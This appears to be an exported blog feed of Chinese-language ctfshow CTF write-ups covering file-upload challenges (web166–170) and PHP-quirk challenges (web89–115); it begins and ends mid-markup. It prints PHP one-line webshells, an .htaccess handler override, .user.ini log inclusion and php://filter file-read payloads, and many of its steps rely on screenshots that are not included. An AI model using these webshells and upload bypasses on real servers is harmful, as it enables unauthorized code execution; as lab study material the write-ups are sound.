src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203058469.png" alt="image-20221225203058469"></p><p>这是里面的木马。</p><p>然后进行抓包rce就行了。</p><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225211902666.png" alt="image-20221225211902666"></p><p>这道题是一道zip类型类型的题目，就是上传文件只能上传zip类型的，然后我们就去本地找一张图片，然后就去转化为zip类型并且上传，并且在zip里写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>然后就进行上传。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212120262.png" alt="image-20221225212120262"></p><p>上传成功后就把request 请求改成POST，刚开始我就是这里没改，找了半天问题。</p><p>然后就可以进行rce了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212238112.png" alt="image-20221225212238112"></p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225230535662.png" alt="image-20221225230535662"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231006048.png" alt="image-20221225231006048"></p><p>题目给了这个东西是与.htaccess有关的，所以这道题是得用到.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;normal_up.jpg&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>上面的文件名是，等会要上传的文件。</p><p><strong>第一步</strong></p><p>先上传一个jpg文件，然后把文件名和文件内容全部改掉，文件名改成.htaccess，文件内容改成上面的代码。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231330037.png" alt="image-20221225231330037"></p><p><strong>第二步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231346882.png" alt="image-20221225231346882"></p><p><strong>第三步</strong></p><p>访问上传图片的地址，然后进行rce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231418066.png" alt="image-20221225231418066"></p><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225233316993.png" alt="image-20221225233316993"></p><p>这道题的坑是在它给的上传目录是没有包含upload的，就是直接访问图片名的话，就是会报错。</p><p>知道这里以后就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接就先上传一个png图片，然后就修改图片内容和后缀就可以了。</span><br></pre></td></tr></table></figure><p>然后访问/upload/图片名    就可进行rce了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234159992.png" alt="image-20221225234159992"></p><h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234946679.png" alt="image-20221225234946679"></p><p>这道题把  &lt;   给过滤掉了，那么php脚本的话，必须得包含它，那么我们就得换另一种形式了，就是包含日志，那么包含日志的话，得需要一个前提就是得有默认文件<strong>index.php</strong></p><p>但是这道题没有，那么我们就得进行构造index.php了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153025708.png" alt="image-20221226153025708"></p><p>成功上传index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153057506.png" alt="image-20221226153057506"></p><p>然后利用.user.ini上传日志包含</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153313062.png" alt="image-20221226153313062"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153332634.png" alt="image-20221226153332634"></p><p>发现测试成功，然后就可以进行读取flag了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153612103.png" alt="image-20221226153612103"></p><p>这里得进行抓包读取，浏览器查看的话，看不出来。</p><h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>源码</p><p><img src="\images\image-20221226153716031.png" alt="image-20221226153716031"></p><p>这题和上一题的解法一模一样，就不多说了。</p><p>​        </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 文件上传 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-PHP特性 刷题记录</title>
      <link href="/posts/94c13720.html"/>
      <url>/posts/94c13720.html</url>
      
        <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211029898.png" alt="image-20221218211029898"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211208944.png" alt="image-20221218211208944"></p><p>利用数组绕过，对num的正则匹配。</p><p>因为    ——&gt;<strong>preg_match只能处理字符串，当传入的subject是数组时会返回false</strong></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211321940.png" alt="image-20221218211321940"></p><p>先解释一下<code>intval</code>的意思</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211520421.png" alt="image-20221218211520421"></p><p>然后这道题就可以通过数字加字母绕过。    <strong><!--也可以使用16进制绕过    ---->   num=0x117c—&gt;</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211550102.png" alt="image-20221218211550102"></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212029537.png" alt="image-20221218212029537"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212822855.png" alt="image-20221218212822855"></p><p>这里解释了<code>^php$/im</code>的意思     m是多行匹配的意思</p><p>^    —-&gt;是指仅匹配/p开头的字符串</p><p>$    —-&gt;是指仅匹配/p结尾的字符串</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a></p><p>这篇文章讲解了php正则遇到的所有符号的含义</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213049399.png" alt="image-20221218213049399"></p><!--为什么可以这样写拿到flag呢，因为第一个if是多行匹配，然后就会形成回车  php,然后就会检索第一行，发现没有php后会接着检索第二行，但是第二个if的话，就是单行匹配，只会匹配到回车符号，然后就结束了，不会接着匹配下一行的php--><p> <code>%0aphp</code>是这样的</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213434661.png" alt="image-20221218213434661"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214708879.png" alt="image-20221218214708879"></p><p>用4476的16进制或者8进制都能绕过</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214745883.png" alt="image-20221218214745883"></p><p><strong>解法2：</strong></p><p><code>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</code></p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214938240.png" alt="image-20221218214938240"></p><p>虽然过滤了字母   我们还可以用8进制表示</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215152296.png" alt="image-20221218215152296"></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215237018.png" alt="image-20221218215237018"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215849892.png" alt="image-20221218215849892"></p><p>先用4476_过滤掉第一个和第二个if，因为第三个函数要求参数里必须得有0，所以在末尾加一个0，就能成功绕过了。</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220051775.png" alt="image-20221218220051775"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220710727.png" alt="image-20221218220710727"></p><p>加号或者空格都能绕过     这两个的url编码也能绕过。</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220854093.png" alt="image-20221218220854093"></p><p> <strong>解法一</strong></p><p>利用php为协议</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151615862.png" alt="image-20221219151615862"></p><p><strong>解法二</strong></p><p><code>./</code>代表当前目录下  所以</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151722800.png" alt="image-20221219151722800"></p><p><strong>解法三</strong></p><p>利用当前目录的路径</p><p><code>/var/www/html</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151841812.png" alt="image-20221219151841812"></p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152132776.png" alt="image-20221219152132776"></p><p>利用数组绕过md5强等于</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152207405.png" alt="image-20221219152207405"></p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152512769.png" alt="image-20221219152512769"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219155526819.png" alt="image-20221219155526819"></p><p>这道题考察的是一个三元运算符</p><!--if(条件)?true:false-->     就是条件成立的话返回true里的值     不成立的返回false里的值首先先分析代码，$_GET如果刚开始没赋值的话就会被强制转换为一个字符串，那么下面的条件都不会成立了，因为$__GET必须得是个数组才能拿到flag,**第一步**得先给GET随便传点值让其为true使其返回```$_GET=&$_POST```变成post型的数组，然后下一行的$_GET就会变成$__POST。**第二步**然后给POST的flag传值为flag，使其转为COOKIE,那么第三行的$__GET就会变成$—COOKIE ，又因为COOKIE的flag没有没有值，就会返回flag，而不是SERVER。**最后一步**所以最后一行的GET就为CCOKIE了，最后只要在COOKIE里添加HTTP_FLAG=flag就可以成功输出flag了## web99源码![image-20221219160616968](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219160616968.png)array_push()   --->的意思是靠rand(1,$i)在1到$i之间产生的随机数，然后赋值到$allow尾部里in_array()   ----> 判断$_GET里的值是否在$allow里这道题就存在这个漏洞在这里。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163711057.png" alt="image-20221219163711057"></p><p>所以就可以利用这个漏洞。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163915275.png" alt="image-20221219163915275"></p><p>先看数组里有没有3这个数字，有的话看能不能写入东西。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163942094.png" alt="image-20221219163942094"></p><p>能写入，然后就可以进行getshell了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在content处写入   &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164220854.png" alt="image-20221219164220854"></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164409059.png" alt="image-20221219164409059"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题先看$v0那里，是赋值和逻辑运算符相加在一起，但是逻辑运算符的的优先级没有赋值的高，所以这里只需要看v1就行，后面的不一定得是数字了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219171715178.png" alt="image-20221219171715178"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为v2不能带;，所以用?&gt;把它给替换掉了 %23是#号，把后面的东西给过滤掉了。v2就是传一句话木马，为什么可以这样写呢，就是eval比较特殊，他是这样的&lt;?php  所以我们前面加的?&gt;是为了与它闭合</span><br><span class="line"> ctfshow.php是/var/www/html目录下的   因为flag36d.txt是假的flag.</span><br></pre></td></tr></table></figure><p>0x2d   —-&gt;   指的是-     替换后以ctfshow{xxxx}提交就行</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219172440204.png" alt="image-20221219172440204"></p><p>这道题考察的是反射类的含义，我也不太懂。。。。。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205625421.png" alt="image-20221219205625421"></p><p>因为flag一般是uuid的，有16位ui，这才有15位，所以得加一个在最后一个位置上   <strong>0-f</strong></p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205806760.png" alt="image-20221219205806760"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题的难点是如何构造v2,看了题目给的解后才发现</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223237023.png" alt="image-20221219223237023"></p><p>它这个构造就很巧妙了，因为这个e可以当作科学计数法来看，所以刚好符合题目要求。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223434325.png" alt="image-20221219223434325"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223442861.png" alt="image-20221219223442861"></p><p>这个就是先进行base64编码，然后在进行16进制转换得到的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个前面构造的16进制前面的数字相当于0x，可以不要，去掉也不影响，所以为了能绕过，就给0x替换成11了.</span><br></pre></td></tr></table></figure><p>因为题目给的substr会把前两位给去掉，所以不影响最终结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后v3传的php伪协议是解码的，所以是先进行16进制转换，然后在进行base64解码，然后写入2.php里。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219224415157.png" alt="image-20221219224415157"></p><p>访问2.php得到flag。</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219225709345.png" alt="image-20221219225709345"></p><p>和上一题的解法一样</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230835495.png" alt="image-20221219230835495"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230941622.png" alt="image-20221219230941622"></p><p>和md5差不多，都是加密函数</p><p>也可以利用数组绕过。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219231030575.png" alt="image-20221219231030575"></p><p>直接令值相等也行。</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219234917550.png" alt="image-20221219234917550"></p><p>foreach里面指的就是这个  —-&gt; $_GET[key]=value</p><p><script type="math/tex">key=</script>value;   ——- &gt;这个是值覆盖</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219235048002.png" alt="image-20221219235048002"></p><p>自己看pl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步，suces=flag的原因是为了绕过第一行的foreach里面的die()，所以利用了suces,然后根据值覆盖，suces就等于$flag.然后第二个post的话，就是为了绕过die()，然后进行值覆盖，那么error就等于$flag了，然后因为没有post flag,所以执行die($error)就等于die($flag).然后就会输出flag.</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143719767.png" alt="image-20221220143719767"></p><p>这道题可以利用数组绕过</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143807143.png" alt="image-20221220143807143"></p><p>这样就可以拿到flag.</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143934377.png" alt="image-20221220143934377"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145147822.png" alt="image-20221220145147822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路就是给v1随便给个值，因为找不到flag这个key，所以会返回false,然后md5传一个数组，md5也不会解析数组，也会返回false.所以相等，然后就会输出flag.</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145531165.png" alt="image-20221220145531165"></p><p>这就是官方解，给的数字的含义。</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128144485">https://blog.csdn.net/qq_63548648/article/details/128144485</a>    可以看下我写的</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145632097.png" alt="image-20221220145632097"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220154959505.png" alt="image-20221220154959505"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00是一个截断字符，就是代表着一个字符串到这就结束了，后面的东西将不会在继续遍历了。</span><br></pre></td></tr></table></figure><p>所以第一个if就是一个以a开头并且以a结尾的一个字符串。然后因为36d转为10进制是877，然后根据题目给的逆转函数就得输入778，然后函数逆转就可以等于36d了。</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220155405748.png" alt="image-20221220155405748"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162752867.png" alt="image-20221220162752867"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加号的含义就是有一个是字母就行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题学到了很多东西，就是利用exception::__toString   这个内置函数</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162429252.png" alt="image-20221220162429252"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数就是echo new Exception(&#x27;aaaa&#x27;)  ---&gt;会直接输出aaaa的报错信息  那么就可以利用这个来进行rce了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还有一种就是 $a=&#x27;phpinfo&#x27;;$a();   这种就会直接输出phpinfo()的界面</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163200636.png" alt="image-20221220163200636"></p><p>然后直接访问fl36dg.txt，就可以直接拿到flag。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163250189.png" alt="image-20221220163250189"></p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220165208448.png" alt="image-20221220165208448"></p><p>这道题因为好多东西都被🈲了，那么只能用字母了，那么system(ls)肯定行不通了，那么我们就得去寻找其他可以用来查看目录的方法了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//filesystemiterator  是一个内置类，用来遍历文件  //继承类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//directoryItrerator  是一个内置类，用来遍历目录  //父类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种类型的题都是利用toString方法  echo new xxxxxxxx;</span><br></pre></td></tr></table></figure><p><strong>写法一</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(diename(__FILE__))</span><br></pre></td></tr></table></figure><p><strong>写法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(&#x27;.&#x27;)   .  ----&gt;是指当前目录</span><br></pre></td></tr></table></figure><p><strong>写法三</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(/var/www/html)</span><br></pre></td></tr></table></figure><p><strong>写法四</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(getcwd())   getcwd()  ----&gt; 取得当前工作目录</span><br></pre></td></tr></table></figure><p><strong>写法五</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator(getcwd())   ---&gt;只会返回当前文件目录的第一个文件</span><br></pre></td></tr></table></figure><p><strong>写法六</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator  也可以利用   directoryItrerator上面的写法，方法是一样的</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220170850889.png" alt="image-20221220170850889"></p><p>这里的文件名排序是按照文件首字母来排序的，因为f排在前面，所以先输出flag。</p><p>然后访问fl36dga.txt就能拿到flag了。</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220171126721.png" alt="image-20221220171126721"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题考察的点是值覆盖，因为v1只需要包含ctfshow就行，那么想要拿到flag，就得用v2给v1覆盖掉，因为函数体内访问的值，只能访问传进来的，因为进行值覆盖了，所以访问不到，那么就得使用全局变量来进行访问了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211211535.png" alt="image-20221220211211535"></p><p>利用的是GLOBALS,全局变量。</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p>源码</p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211312978.png" alt="image-20221220211312978"></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这道题通过过滤的东西，和is_file()这个函数，就能判断出这是需要php伪协议做的</span><br><span class="line">is_file()   这个可以不影响file_get_contents   highlight_file</span><br></pre></td></tr></table></figure><p>is_file()  </p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220212932303.png" alt="image-20221220212932303"></strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213031242.png" alt="image-20221220213031242"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为php://filter/resource=flag.php  不是一个文件名，所以会返回false，绕过第一层的if判断，然后通过php伪协议传的flag.php就可以成功输出了。  这个伪协议是把过滤器给去掉后的样子</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213352149.png" alt="image-20221220213352149"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不去掉利用别的过滤器也行，这是官方的wp</span><br></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213618137.png" alt="image-20221220213618137"></p><p>这道题把php://filter协议给过滤掉了。那我们可以尝试下zlip协议</p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a>   这篇文章把好几种可以用到的协议都总结到一起了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214343035.png" alt="image-20221220214343035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这就是zlip协议的用法。</span><br></pre></td></tr></table></figure><p>下面是官方的解法</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214452423.png" alt="image-20221220214452423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是用了目录溢出的方法，可以记记，当作一个积累</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214604506.png" alt="image-20221220214604506"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还有一种伪协议是glob://flag.php    但是这题用不了，因为就是这个返回的是一个数组，highlight_file不能高亮一个数组，所以可以当个积累。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仔细瞧瞧，发现这里没过滤filter,那么就可以用老办法来试一下了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215659735.png" alt="image-20221220215659735"></p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215805366.png" alt="image-20221220215805366"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220221842229.png" alt="image-20221220221842229"></p><p>这个是trim()函数会删掉的东西，不过我们也可以把这个当作一个知识点，就是以后碰到这种需要判断数字的时候，可以利用这些字符来绕过。当然，看到这里，发现缺了个<code>0x0C</code>,刚好可以利用来绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 